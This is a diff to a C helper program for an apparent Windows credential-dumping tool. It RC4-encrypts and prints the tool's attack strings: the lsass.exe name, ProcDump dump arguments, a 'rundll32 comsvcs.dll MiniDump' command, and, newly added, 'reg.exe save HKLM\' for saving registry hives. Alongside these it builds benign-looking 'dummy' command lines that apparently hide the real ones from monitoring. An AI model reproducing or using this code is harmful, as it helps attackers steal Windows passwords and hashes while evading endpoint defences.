@@ -1,7 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 
-unsigned char rc4Key[] = {
+unsigned char strEncKey[] = {
 		0x59, 0xF3, 0x3F, 0x99, 0xD2, 0x3D, 0x4E, 0x67, 0x29, 0xCC, 0xF8, 0x3A, 0x1F, 0x6A, 0x1B, 0xC3,
 		0x34, 0xEA, 0x81, 0x0E, 0x36, 0x0D, 0xEA, 0xB2, 0x2D, 0x00, 0x38, 0x0B, 0xA6, 0x89, 0xC1, 0x7A };
 
@@ -15,12 +15,16 @@ unsigned char procDumpArgs[] = {
 };
 
 // Dummy args can be anything, make sure it's long enough
-WCHAR dummyProcDumpArgs[] = L"-accepteula -mp explorer.exe -o C:\\Dumps\\explorer_highusage.dmp -cpu 80 -mem 75% -interval 1m -duration 30m";
+WCHAR dummyProcDumpArgs[] = L"-accepteula -mp file_explorer.exe -o C:\\Dumps\\explorer_highusage.dmp -cpu 80 -mem 75% -interval 1m -duration 30m";
 
 WCHAR comsvcsArgs[] = L"C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump";
 
 // this must start with C:\\Windows\\System32\\rundll32.exe
 WCHAR dummyComsvcsArgs[] = L"C:\\Windows\\System32\\rundll32.exe OpenOptimizationControlPanel /cleanup:tempfiles /defrag:all-drives /optimize:startup /schedule:daily /report:";
+
+WCHAR regArgs[] = L"C:\\Windows\\System32\\reg.exe save HKLM\\";
+
+WCHAR dummyRegArgs[] = L"C:\\Windows\\System32\\reg.exe export HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion";
 
 VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
 
@@ -76,9 +80,9 @@ BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN D
 int main() {
 	printf("In main file:\n\n");
 
-	PrintHexData("rc4Key", rc4Key, sizeof(rc4Key));
+	PrintHexData("strEncKey", strEncKey, sizeof(strEncKey));
 
-	if (!Rc4EncryptionViaSystemFunc032(rc4Key, lsassExeStr, sizeof(rc4Key), sizeof(lsassExeStr))) {
+	if (!Rc4EncryptionViaSystemFunc032(strEncKey, lsassExeStr, sizeof(strEncKey), sizeof(lsassExeStr))) {
 		return -1;
 	}
 	PrintHexData("lsassExeStr", lsassExeStr, sizeof(lsassExeStr));
@@ -88,33 +92,45 @@ int main() {
 	//}
 	//PrintHexData("parentProcessStr", parentProcessStr, sizeof(parentProcessStr));
 
-	if (!Rc4EncryptionViaSystemFunc032(rc4Key, procDumpArgs, sizeof(rc4Key), sizeof(procDumpArgs))) {
+	if (!Rc4EncryptionViaSystemFunc032(strEncKey, procDumpArgs, sizeof(strEncKey), sizeof(procDumpArgs))) {
 		return -1;
 	}
 	PrintHexData("procDumpArgs", procDumpArgs, sizeof(procDumpArgs));
 
-	if (!Rc4EncryptionViaSystemFunc032(rc4Key, dummyProcDumpArgs, sizeof(rc4Key), sizeof(dummyProcDumpArgs))) {
+	if (!Rc4EncryptionViaSystemFunc032(strEncKey, dummyProcDumpArgs, sizeof(strEncKey), sizeof(dummyProcDumpArgs))) {
 		return -1;
 	}
 	PrintHexData("dummyProcDumpArgs", dummyProcDumpArgs, sizeof(dummyProcDumpArgs));
 
-	if (!Rc4EncryptionViaSystemFunc032(rc4Key, comsvcsArgs, sizeof(rc4Key), sizeof(comsvcsArgs))) {
+	if (!Rc4EncryptionViaSystemFunc032(strEncKey, comsvcsArgs, sizeof(strEncKey), sizeof(comsvcsArgs))) {
 		return -1;
 	}
 	PrintHexData("comsvcsArgs", comsvcsArgs, sizeof(comsvcsArgs));
 
-	if (!Rc4EncryptionViaSystemFunc032(rc4Key, dummyComsvcsArgs, sizeof(rc4Key), sizeof(dummyComsvcsArgs))) {
+	if (!Rc4EncryptionViaSystemFunc032(strEncKey, dummyComsvcsArgs, sizeof(strEncKey), sizeof(dummyComsvcsArgs))) {
 		return -1;
 	}
 	PrintHexData("dummyComsvcsArgs", dummyComsvcsArgs, sizeof(dummyComsvcsArgs));
 
+	if (!Rc4EncryptionViaSystemFunc032(strEncKey, regArgs, sizeof(strEncKey), sizeof(regArgs))) {
+		return -1;
+	}
+	PrintHexData("regArgs", regArgs, sizeof(regArgs));
+
+	if (!Rc4EncryptionViaSystemFunc032(strEncKey, dummyRegArgs, sizeof(strEncKey), sizeof(dummyRegArgs))) {
+		return -1;
+	}
+	PrintHexData("dummyRegArgs", dummyRegArgs, sizeof(dummyRegArgs));
+
 	printf("In Common.h:\n\n");
 
-	printf("extern unsigned char rc4Key[%d];\n", sizeof(rc4Key));
+	printf("extern unsigned char strEncKey[%d];\n", sizeof(strEncKey));
 	printf("extern unsigned char lsassExeStr[%d];\n", sizeof(lsassExeStr));
 	//printf("extern unsigned char parentProcessStr[%d];\n", sizeof(parentProcessStr));
 	printf("extern unsigned char procDumpArgs[%d];\n", sizeof(procDumpArgs));
 	printf("extern unsigned char dummyProcDumpArgs[%d];\n", sizeof(dummyProcDumpArgs));
 	printf("extern unsigned char comsvcsArgs[%d];\n", sizeof(comsvcsArgs));
 	printf("extern unsigned char dummyComsvcsArgs[%d];\n", sizeof(dummyComsvcsArgs));
+	printf("extern unsigned char regArgs[%d];\n", sizeof(regArgs));
+	printf("extern unsigned char dummyRegArgs[%d];\n", sizeof(dummyRegArgs));
 }
